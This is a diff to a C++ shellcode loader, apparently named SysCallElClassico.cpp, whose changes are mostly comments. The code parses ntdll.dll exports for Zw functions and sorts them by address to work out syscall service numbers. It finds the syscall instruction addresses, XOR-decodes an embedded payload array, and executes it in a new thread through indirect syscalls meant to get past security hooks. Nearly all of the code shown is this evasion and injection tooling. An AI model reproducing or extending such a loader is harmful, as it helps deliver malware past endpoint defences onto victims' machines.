@@ -1,8 +1,5 @@
-// SysCallElClassico.cpp 
-// we want to find all the Zw function and order them so that we can get the right syscall
-// so parsing the ntdll.dll in memory and retrieve the list of all the functions
-// using custom GetProcAddress and GetModuleHandle
-//
+// You got my SSN so syscall me maybe?
+
 
 #include <iostream>
 #include <Windows.h>
@@ -53,7 +50,7 @@ int randomInt(int max) {
 	return random;
 }
 
-//return random pair object from map
+//return random pair object from map, using the randomInt defined above
 std::pair<std::string, ZW_ATTR> randomMapElement(std::unordered_map<std::string, ZW_ATTR> zwFunctions) {
 	
 	auto it = zwFunctions.begin();
@@ -61,34 +58,35 @@ std::pair<std::string, ZW_ATTR> randomMapElement(std::unordered_map<std::string,
 	return *it;
 }
 
-//create new comparator 
+//create new comparator, so that we can choose basing on what parameter we want to out the map
 bool sortByAddr(std::pair<std::string, ZW_ATTR> &a, std::pair<std::string, ZW_ATTR> &b) {
 
 	return (a.second.addr < b.second.addr);
 
 }
 
-//sort map with custom comparator
+//sort map with custom comparator defined above
 std::unordered_map<std::string, ZW_ATTR> sortMap(std::vector<std::pair<std::string, ZW_ATTR>> vec) {
 
 	//sorting vector by memory addr
 	sort(vec.begin(),vec.end(), sortByAddr);
-	//assigning SSN
+	//assigning SSN basing on the index since addresses are sorted by now
 	for (int i = 0; i < vec.size(); i++) {
 		vec[i].second.ssn = i;
 	}
 	//creating map for easy access
 	std::unordered_map<std::string, ZW_ATTR> sortedMap;
 	for (auto& pair : vec) {
-		// Inserting into the map with the first element of the pair as the key
+		// Inserting into the map with the first element (name of the function) of the pair as the key
 		sortedMap[pair.first] = pair.second;
 	}
 	return sortedMap;
 }
 
-//retrieve syscall instructions address
+//retrieve syscall instructions address matching the sequence of bytes representing the syscall ops
 PBYTE retrieveSCAddr(PBYTE funcStar) {
 
+	//we do not want to go too far if we do not find it for some reason
 	int emergencybreak = 0;
 	while (funcStar && emergencybreak < 2048) {
 		//taking into account indianess crazyness
@@ -155,12 +153,17 @@ std::unordered_map<std::string, ZW_ATTR> findZWFunctions(IN HMODULE hModule) {
 	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
 
 		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
+		//compare only first two chars
 		if (strncmp(pFunctionName, "Zw", 2) == 0) {
+			//retrieve the syscall opcodes address
 			syscallAddr = retrieveSCAddr((PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]));
+			//initialize the struct with a null SSN
 			ZW_ATTR attr = {0, (FARPROC)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]), syscallAddr };
+			//initialize the vector
 			vec.push_back({ pFunctionName, attr });			
 		}
 	}
+	//return a bella sorted hashmap
 	return sortMap(vec);
 }
 
@@ -174,7 +177,7 @@ VOID OBXOR(PBYTE pShellcode, SIZE_T sShellcodeSize, PBYTE bKey, SIZE_T sKeySize)
 	}
 }
 
-//prep syscall ops
+//prep syscall ops - set gloab extern variables used in the ASM code
 VOID prepSysCall(const char* ZwFunction) {
 
 	SSN = (DWORD)zwFunctions[ZwFunction].ssn;
@@ -208,10 +211,7 @@ unsigned char Payload[] =
 
 BOOL executePayload(std::unordered_map<std::string, ZW_ATTR> zwFunctions, unsigned char payload[], SIZE_T payloadSize) {
 
-	// allocating memory 
 	PVOID pAddress = NULL;
-	//A pointer to a variable that will receive the actual size, in bytes, of the allocated region of pages
-	//The initial value of this parameter specifies the size, in bytes, of the region and is rounded up to the next host page size boundary
 	SIZE_T sSize = payloadSize;
 	NTSTATUS STATUS = 0x00;
 	SIZE_T sNumberOfBytesWritten = NULL;
@@ -245,7 +245,7 @@ BOOL executePayload(std::unordered_map<std::string, ZW_ATTR> zwFunctions, unsign
 		return FALSE;
 	}
 	printf("[+] Executed thread with Id : %d\n", GetThreadId(hThread));
-	
+	//forgot and too lazy to indirect-syscall this one too
 	WaitForSingleObject(hThread,0xFFFFFFFF);
 	return TRUE;
 }
